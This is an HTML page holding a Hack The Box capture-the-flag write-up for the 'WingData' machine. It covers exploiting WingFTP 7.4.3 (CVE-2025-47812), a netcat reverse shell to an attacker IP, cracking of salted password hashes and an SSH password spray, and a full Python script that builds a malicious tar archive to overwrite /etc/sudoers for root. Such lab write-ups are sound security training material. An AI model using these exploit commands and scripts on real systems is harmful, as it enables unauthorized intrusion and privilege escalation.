@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Season10 - Writeups - WingData</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="shortcut icon" href="/static/images/favicon.png" type="image/x-icon">
+</head>
+<body>
+    <canvas class="matrix-bg" id="matrix"></canvas>
+
+    <header>
+        <div class="header-content">
+            <div class="terminal-prompt">k0d14k@kali:~#</div>
+            <div class="img-text">
+                <img src="/static/images/avatar.png" width="100rem">
+                <div class="text">
+                    <h1>Luca Puzzoni<span class="typing-cursor">_</span></h1>
+                    <p class="subtitle">Softwate Security Consultant | Hacker | Full Stack Web Developer</p>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/#about">Whoami</a></li>
+            <li><a href="/#skills">Skills</a></li>
+            <li><a href="/#projects">Projects</a></li>
+            <li><a href="/#contact">Contacts</a></li>
+        </ul>
+    </nav>
+
+    <button id="backToTop">↑</button>
+
+    <main style="text-align: justify;">     
+        <img src="images/wingdata.png" alt="500rem">   
+        <h1>WingData - HTB Season 10</h1>
+
+        <p>
+          <b>Categories</b>: #WingFTP, #CVE-2025-47812, #buffer-overflow, #python3-os-path-realpath-bof, #sudoers-overwrite
+        </p>
+
+        <hr>
+
+        <section id="index">
+            <h2>ls -l index</h2>
+            <div class="project">
+                <!--USED BY THE LISTER-->
+                <span id="time" hidden>26 Apr 14 01:10</span>
+            </div>
+        </section>
+
+        <section id="tcp-scan">
+            <h2>cat tcp-scan</h2>
+
+            <div class="code">
+                # Nmap 7.98 scan initiated Wed Feb 18 22:25:41 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -vv --top-ports 10000 -oA nmap-top-ports wingdata.htb <br>
+                Nmap scan report for wingdata.htb (10.129.2.10) <br>
+                Host is up, received reset ttl 63 (0.058s latency). <br>
+                Scanned at 2026-02-18 22:25:42 CET for 38s <br>
+                Not shown: 8378 filtered tcp ports (no-response) <br>
+                PORT   STATE SERVICE REASON         VERSION <br>
+                22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0) <br>
+                | ssh-hostkey: <br>
+                |   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA) <br>
+                | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL+8LZAmzRfTy+4t8PJxEvRWhPho8aZj9ImxRfWn9TKepkxh8pAF3WDu55pd/gaSUGIo9cuOvv+3r6w7IuCpqI4= <br>
+                |   256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519) <br>
+                |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFFmcxflCAAe4LPgkg7hOxJen41bu6zaE/y08UnA4oRp <br>
+                80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.66 <br>
+                |_http-title: WingData Solutions <br>
+                |_http-server-header: Apache/2.4.66 (Debian) <br>
+                | http-methods: <br>
+                |_  Supported Methods: HEAD GET POST OPTIONS <br>
+                Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel <br>
+                <br>
+                Read data files from: /usr/share/nmap <br>
+                Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . <br>
+                # Nmap done at Wed Feb 18 22:26:20 2026 -- 1 IP address (1 host up) scanned in 39.19 seconds <br>
+            </div>
+
+            <p>The TCP port scan shows only ports 22 and 80.</p>
+
+            <div class="code">
+                echo '10.129.2.10 wingdata.htb' | sudo tee -a /etc/hosts
+            </div>
+        </section>
+
+        <section id="enumeration">
+            <h2>cat enumeration</h2>
+
+            <p>The web application exposed on port 80 shows the landing page of a well-known FTP server, <span class="highlight">WingFTP</span>.</p>
+
+            <img src="images/Pasted image 20260218223753.png" width="1000rem">
+
+            <p>
+                Clicking the <span class="highlight">Client Portal</span> button redirects us to the host <span class="highlight">ftp.wingdata.htb</span>.
+            </p>
+
+            <div class="code">
+                echo '10.129.2.10 ftp.wingdata.htb' | sudo tee -a /etc/hosts
+            </div>
+
+            <p>This login page discloses the server version (WingFTP v7.4.3).</p>
+
+            <img src="images/Pasted image 20260218223940.png" width="1000rem">
+        </section>
+
+        <section id="foothold">
+            <h2>cat foothold</h2>
+            <p>
+                An Unauthenticated RCE exists for WingFTP 7.4.3, tracked as <a target="_blank" href="https://www.exploit-db.com/exploits/52347">CVE-2025-47812</a>.
+            </p>
+
+            <div class="code">
+                python3 52347.py -u http://ftp.wingdata.htb -c 'whoami; id; hostname' <br>
+                <br>
+                [*] Testing target: http://ftp.wingdata.htb <br>
+                [+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'whoami; id; hostname' and username: 'anonymous' <br>
+                [+] UID extracted: 846a1de13be07f91cf70c4e74655211af528764d624db129b32c21fbca0cb8d6 <br>
+                [+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 846a1de13be07f91cf70c4e74655211af528764d624db129b32c21fbca0cb8d6 <br>
+                <br>
+                --- Command Output --- <br>
+                wingftp <br>
+                uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev) <br>
+                wingdata <br>
+                ---------------------- <br>
+            </div>
+
+            <p>The next step is to establish a reverse shell:</p>
+
+            <div class="code">
+                python3 52347.py -u http://ftp.wingdata.htb -c 'nc 10.10.14.210 1234 -e /bin/sh' <br>
+                <br>
+                [*] Testing target: http://ftp.wingdata.htb <br>
+                [+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'nc 10.10.14.210 1234 -e /bin/sh' and username: 'anonymous' <br>
+                [+] UID extracted: a9f25956878595b75c3e6a70e5e61c48f528764d624db129b32c21fbca0cb8d6 <br>
+                [+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: a9f25956878595b75c3e6a70e5e61c48f528764d624db129b32c21fbca0cb8d6 <br>
+            </div>
+
+            <p>From inside the reverse shell, among various operations, I perform some password hunting and recover several password hashes:</p>
+
+            <div class="code">
+                grep -rn /opt -ie "&lt;Password>" 2>/dev/null <br>
+                /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml:5:&nbsp;&nbsp;&nbsp;&lt;Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba&lt;/Password> <br>
+                /opt/wftpserver/Data/1/users/maria.xml:7:&nbsp;&nbsp;&nbsp;&lt;Password>a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03&lt;/Password> <br>
+                /opt/wftpserver/Data/1/users/steve.xml:7:&nbsp;&nbsp;&nbsp;&lt;Password>5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca&lt;/Password> <br>
+                /opt/wftpserver/Data/1/users/wacky.xml:7:&nbsp;&nbsp;&nbsp;&lt;Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password> <br>
+                /opt/wftpserver/Data/1/users/anonymous.xml:7:&nbsp;&nbsp;&nbsp;&lt;Password>d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca&lt;/Password> <br>
+                /opt/wftpserver/Data/1/users/john.xml:7:&nbsp;&nbsp;&nbsp;&lt;Password>c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10&lt;/Password> <br>
+            </div>
+
+            <p>
+                After several cracking attempts, hashcat was unable to find any match. Before proceeding, I try to understand what type of hash 
+                these are by reading some of the files in full, but with little success. I then try escalating by reading the <span class="highlight">settings.xml</span> 
+                file inside <span class="highlight">Data/1</span>, and I actually discover something interesting.
+            </p>
+
+            <img src="images/Pasted image 20260219140531.png" width="1000rem">
+
+            <p>A salt has been applied to these hashes. I now launch hashcat taking the salt into account as well:</p>
+            
+            <div class="code">
+                hashcat -m 1410 hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show <br>
+                <br>
+                32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5 <br>
+                d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca:WingFTP: <br>
+            </div>
+
+            <p>From the filenames I extract a list of usernames and perform a password spray against <span class="highlight">ssh</span>:</p>
+
+            <div class="code">
+                nxc ssh ftp.wingdata.htb -u users.txt -p '!#7Blushing^*Bride5' <br>
+                <br>
+                SSH         10.129.2.229    22     ftp.wingdata.htb [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7 <br>
+                SSH         10.129.2.229    22     ftp.wingdata.htb [-] maria:!#7Blushing^*Bride5 <br>
+                SSH         10.129.2.229    22     ftp.wingdata.htb [-] steve:!#7Blushing^*Bride5 <br>
+                SSH         10.129.2.229    22     ftp.wingdata.htb [+] wacky:!#7Blushing^*Bride5 (Pwn3d!) Linux - Shell access! <br>
+            </div>
+
+            <p>And here is our initial access and the retrieval of the user flag:</p>
+            
+            <div class="code">
+                ssh wacky@ftp.wingdata.htb      <br>
+                <br>
+                ... <br>
+                wacky@ftp.wingdata.htb's password: <br> 
+                ... <br>
+                <br>
+                wacky@wingdata:~$ cat user.txt <br>
+                dd474d579c0ce0db8d0e504b96971a31 <br>
+                wacky@wingdata:~$ 
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>cat privilege-escalation</h2>
+            <p>Once logged in, I discover I can run a custom script with sudo:</p>
+
+            <div class="code">
+                wacky@wingdata:~$ sudo -l <br>
+                Matching Defaults entries for wacky on wingdata: <br>
+                &nbsp;&nbsp;&nbsp;env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty <br>
+                <br>
+                User wacky may run the following commands on wingdata: <br>
+                &nbsp;&nbsp;&nbsp;(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py * <br>
+            </div>
+
+            <p>
+                Using ChatGPT to analyze the script, I discover a vulnerability caused by <span class="highlight">filter="data"</span>. 
+                Specifically, when this filter is invoked by <span class="highlight">tar.extractall</span>, it internally calls 
+                <span class="highlight">os.path.realpath</span>, which is vulnerable to a <span class="highlight">Buffer Overflow</span>. 
+                Searching online for this issue, I found a Google security advisory available <a target="_blank" href="https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f">here</a>.
+            </p>
+
+            <p>
+                I therefore concluded that the privilege escalation vector was overwriting a sensitive file. In our case, to become root, we can 
+                rewrite <span class="highlight">/etc/sudoers</span> to allow us to run <span class="highlight">sudo su</span> with the credentials 
+                we already have. I then asked Claude to create the following script:
+            </p>
+
+            <div class="code">
+                #!/usr/bin/env python3 <br>
+                """ <br>
+                Tarfile symlink depth exploitation for path traversal bypass. <br>
+                <br>
+                Creates deeply nested symlink chain to confuse filter="data" path resolution, <br>
+                then escapes to overwrite /etc/sudoers for privilege escalation. <br>
+                <br>
+                Technique: Abuse max path length and symlink resolution to bypass filter checks. <br>
+                """ <br>
+                <br>
+                import tarfile <br>
+                import io <br>
+                import os <br>
+                <br>
+                # Configuration <br>
+                OUTPUT_TAR = "/tmp/backup_9999.tar" <br>
+                SUDOERS_PAYLOAD = b"wacky ALL=(ALL) NOPASSWD: ALL\n" <br>
+                <br>
+                # Path construction constants <br>
+                DIR_NAME = 'd' * 247&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  # Max component length (255 - margin) <br>
+                SYMLINK_CHAIN = "abcdefghijklmnop"  # 16 deep symlink chain <br>
+                LINK_NAME = 'l' * 254&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # Near-max filename length <br>
+                <br>
+                def create_symlink_maze(tar, steps): <br>
+                &nbsp;&nbsp;&nbsp;""" <br>
+                &nbsp;&nbsp;&nbsp;Build nested directory structure with symlinks at each level. <br>
+                &nbsp;&nbsp;&nbsp;Creates confusion chain: dir -> symlink -> dir -> symlink... <br>
+                &nbsp;&nbsp;&nbsp;""" <br>
+                &nbsp;&nbsp;&nbsp;current_path = "" <br>
+                &nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;for step_char in steps: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Create directory <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir_info = tarfile.TarInfo(os.path.join(current_path, DIR_NAME)) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dir_info.type = tarfile.DIRTYPE <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar.addfile(dir_info) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Create symlink pointing to the directory <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sym_info = tarfile.TarInfo(os.path.join(current_path, step_char)) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sym_info.type = tarfile.SYMTYPE <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sym_info.linkname = DIR_NAME <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar.addfile(sym_info) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Descend into the maze <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_path = os.path.join(current_path, DIR_NAME) <br>
+                &nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;return current_path <br>
+                <br>
+                def create_escape_chain(tar, steps): <br>
+                &nbsp;&nbsp;&nbsp;""" <br>
+                &nbsp;&nbsp;&nbsp;Create final symlink that traverses back up using '../' chain <br>
+                &nbsp;&nbsp;&nbsp;to break out of staging directory. <br>
+                &nbsp;&nbsp;&nbsp;""" <br>
+                &nbsp;&nbsp;&nbsp;# Build path through symlink chain: a/b/c/d/.../link <br>
+                &nbsp;&nbsp;&nbsp;link_path = os.path.join("/".join(steps), LINK_NAME) <br>
+                &nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;# Symlink points back up to root of staging <br>
+                &nbsp;&nbsp;&nbsp;escape_depth = len(steps) <br>
+                &nbsp;&nbsp;&nbsp;link_info = tarfile.TarInfo(link_path) <br>
+                &nbsp;&nbsp;&nbsp;link_info.type = tarfile.SYMTYPE <br>
+                &nbsp;&nbsp;&nbsp;link_info.linkname = "../" * escape_depth <br>
+                &nbsp;&nbsp;&nbsp;tar.addfile(link_info) <br>
+                &nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;return link_path <br>
+                <br>
+                def exploit_to_etc(tar, escape_link): <br>
+                &nbsp;&nbsp;&nbsp;""" <br>
+                &nbsp;&nbsp;&nbsp;Use the escape symlink to traverse to /etc and overwrite sudoers. <br>
+                &nbsp;&nbsp;&nbsp;""" <br>
+                &nbsp;&nbsp;&nbsp;# Create symlink to /etc through the escape chain <br>
+                &nbsp;&nbsp;&nbsp;etc_link = tarfile.TarInfo("escape") <br>
+                &nbsp;&nbsp;&nbsp;etc_link.type = tarfile.SYMTYPE <br>
+                &nbsp;&nbsp;&nbsp;etc_link.linkname = f"{escape_link}/../../../../../../../etc" <br>
+                &nbsp;&nbsp;&nbsp;tar.addfile(etc_link) <br>
+                &nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;# Hardlink to sudoers file <br>
+                &nbsp;&nbsp;&nbsp;sudoers_hardlink = tarfile.TarInfo("sudoers_link") <br>
+                &nbsp;&nbsp;&nbsp;sudoers_hardlink.type = tarfile.LNKTYPE <br>
+                &nbsp;&nbsp;&nbsp;sudoers_hardlink.linkname = "escape/sudoers" <br>
+                &nbsp;&nbsp;&nbsp;tar.addfile(sudoers_hardlink) <br>
+                &nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;# Overwrite hardlink with malicious content <br>
+                &nbsp;&nbsp;&nbsp;sudoers_payload = tarfile.TarInfo("sudoers_link") <br>
+                &nbsp;&nbsp;&nbsp;sudoers_payload.type = tarfile.REGTYPE <br>
+                &nbsp;&nbsp;&nbsp;sudoers_payload.size = len(SUDOERS_PAYLOAD) <br>
+                &nbsp;&nbsp;&nbsp;tar.addfile(sudoers_payload, fileobj=io.BytesIO(SUDOERS_PAYLOAD)) <br>
+                <br>
+                def main(): <br>
+                &nbsp;&nbsp;&nbsp;""" <br>
+                &nbsp;&nbsp;&nbsp;Construct exploit tar with symlink maze leading to /etc/sudoers overwrite. <br>
+                &nbsp;&nbsp;&nbsp;""" <br>
+                &nbsp;&nbsp;&nbsp;with tarfile.open(OUTPUT_TAR, mode="w") as tar: <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Phase 1: Build confusing symlink depth maze <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create_symlink_maze(tar, SYMLINK_CHAIN) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Phase 2: Create escape hatch symlink <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;escape_link = create_escape_chain(tar, SYMLINK_CHAIN) <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Phase 3: Exploit escape to overwrite /etc/sudoers <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exploit_to_etc(tar, escape_link) <br>
+                &nbsp;&nbsp;&nbsp; <br>
+                &nbsp;&nbsp;&nbsp;print(f"[+] Exploit tar created: {OUTPUT_TAR}") <br>
+                &nbsp;&nbsp;&nbsp;print(f"[+] Target: /etc/sudoers") <br>
+                &nbsp;&nbsp;&nbsp;print(f"[+] Symlink depth: {len(SYMLINK_CHAIN)} levels") <br>
+                &nbsp;&nbsp;&nbsp;print(f"[+] Payload: {SUDOERS_PAYLOAD.decode().strip()}") <br>
+                &nbsp;&nbsp;&nbsp;print("\n[*] Deploy: cp /tmp/backup_9999.tar /opt/backup_clients/backups/") <br>
+                &nbsp;&nbsp;&nbsp;print("[*] Execute: sudo python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn") <br>
+                &nbsp;&nbsp;&nbsp;print("[*] Verify: sudo -l") <br>
+                <br>
+                if __name__ == "__main__": <br>
+                &nbsp;&nbsp;&nbsp;main()
+            </div>
+
+            <p>Once saved to <span class="highlight">poc.py</span>, executed and the instructions followed:</p>
+
+            <div class="code">
+                wacky@wingdata:~$ nano poc.py <br>
+                wacky@wingdata:~$ python3 poc.py  <br>
+                [+] Exploit tar created: /tmp/backup_9999.tar <br>
+                [+] Target: /etc/sudoers <br>
+                [+] Symlink depth: 16 levels <br>
+                [+] Payload: wacky ALL=(ALL) NOPASSWD: ALL <br>
+                <br>
+                [*] Deploy: cp /tmp/backup_9999.tar /opt/backup_clients/backups/ <br>
+                [*] Execute: sudo python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn <br>
+                [*] Verify: sudo -l <br>
+                wacky@wingdata:~$ cp /tmp/backup_9999.tar /opt/backup_clients/backups/ <br>
+                wacky@wingdata:~$ sudo python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn <br>
+                [+] Backup: backup_9999.tar <br>
+                [+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn <br>
+                [+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn <br>
+                wacky@wingdata:~$ sudo -l <br>
+                User wacky may run the following commands on wingdata: <br>
+                &nbsp;&nbsp;&nbsp;(ALL) NOPASSWD: ALL <br>
+                wacky@wingdata:~$ sudo su <br>
+                root@wingdata:/home/wacky# cat /root/root.txt  <br>
+                2793a9c021a5d1a7dd455574f2c6a51f
+            </div>
+        </section>
+        
+
+        <section id="flags">
+            <h2>cat flags</h2>
+            <h3><b>User Flag:</b> dd474d579c0ce0db8d0e504b96971a31</h3>
+            <h3><b>Root Flag:</b> 2793a9c021a5d1a7dd455574f2c6a51f</h3>
+        </section>
+    </main>
+
+
+    <footer>
+        <p>Built with GitHub Pages —— Securing the web, one bug at a time.</p>
+        <p>&copy; 2025 K0D14K</p>
+    </footer>
+
+    <script src="/static/script.js"></script>
+    <script> lister() </script>
+</body>
